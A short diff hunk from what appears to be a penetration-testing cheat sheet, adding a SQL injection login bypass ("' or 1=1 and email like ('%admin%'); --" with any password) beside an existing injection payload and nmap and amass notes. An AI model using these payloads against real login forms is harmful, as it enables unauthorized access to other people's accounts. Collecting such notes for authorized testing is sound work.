@@ -59,6 +59,11 @@ cat nmap_scan.txt | grep open http://pic.example.com
           
 AAAA')/**/or/**/(select/**/1)=1%23
 
+login 
+  ' or 1=1 and email like ('%admin%'); -- 
+  any password
+
+
 
 ----------------------------------------------------------------------------------------------
 amass <<
